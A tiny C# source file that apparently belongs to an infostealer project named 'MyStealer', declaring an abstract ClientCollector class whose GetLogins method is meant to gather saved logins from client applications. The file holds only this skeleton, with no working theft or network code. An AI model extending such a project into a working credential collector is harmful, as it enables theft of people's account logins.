using System.Collections.Immutable;

namespace MyStealer.Collectors.Client
{
    public abstract class ClientCollector : ModuleBase
    {
        public abstract IImmutableSet<ClientLogin> GetLogins();
    }
}
